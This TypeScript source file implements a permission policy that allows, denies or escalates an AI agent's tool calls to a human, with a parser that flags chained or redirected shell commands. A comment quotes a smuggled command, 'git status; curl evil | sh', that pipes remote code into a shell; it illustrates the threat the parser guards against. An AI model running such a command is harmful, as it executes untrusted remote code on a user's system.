// Permission policy: decides, per tool call, whether it runs, is refused, or
// needs a human. The model never sees this code; it only sees the outcome.
export type Decision = "allow" | "deny" | "ask";

export interface Rule {
  tool: string;            // tool name, or "*"
  match?: RegExp;          // tested against the call's summary line
  decision: Decision;
  reason?: string;
}

export interface Verdict { decision: Decision; reason: string }

// Does the command contain shell syntax that can turn one command into
// several, substitute output, or redirect? A rule like /^git status/ must not
// approve "git status; curl evil | sh". Quotes matter: inside '...' nothing is
// special, inside "..." only $ and ` still expand. Anything we cannot follow
// (a backslash, an unclosed quote) counts as dangerous.
export function hasShellSyntax(cmd: string): boolean {
  let q: "'" | '"' | null = null;
  for (const c of cmd) {
    if (q === "'") { if (c === "'") q = null; continue; }
    if (q === '"') { if (c === '"') q = null; else if (c === "$" || c === "`" || c === "\\") return true; continue; }
    if (c === "'" || c === '"') { q = c; continue; }
    if (";&|<>()$`\\\n".includes(c)) return true;
  }
  return q !== null || /^\s*(eval|exec|source|\.)\s/.test(cmd);
}

export class Policy {
  constructor(private rules: Rule[], private readOnlyTools: Set<string>, private checkShell = true) {}

  evaluate(tool: string, summary: string): Verdict {
    const hits = this.rules.filter((r) => (r.tool === "*" || r.tool === tool) && (!r.match || r.match.test(summary)));
    // Precedence is by severity, not order: one matching deny beats any allow.
    const deny = hits.find((r) => r.decision === "deny");
    if (deny) return { decision: "deny", reason: deny.reason ?? "denied by policy" };
    if (this.checkShell && tool === "bash" && hasShellSyntax(summary.replace(/^bash: /, ""))) {
      return { decision: "ask", reason: "compound or redirected shell command" };
    }
    const ask = hits.find((r) => r.decision === "ask");
    if (ask) return { decision: "ask", reason: ask.reason ?? "policy asks" };
    if (hits.some((r) => r.decision === "allow")) return { decision: "allow", reason: "allowed by rule" };
    if (this.readOnlyTools.has(tool)) return { decision: "allow", reason: "read-only tool" };
    return { decision: "ask", reason: "no rule matched" }; // default for side effects
  }
}

// What happens on "ask". A terminal UI would prompt; a CI run would refuse.
export type Approver = (tool: string, summary: string, reason: string) => Promise<boolean>;
export const refuseAll: Approver = async () => false;
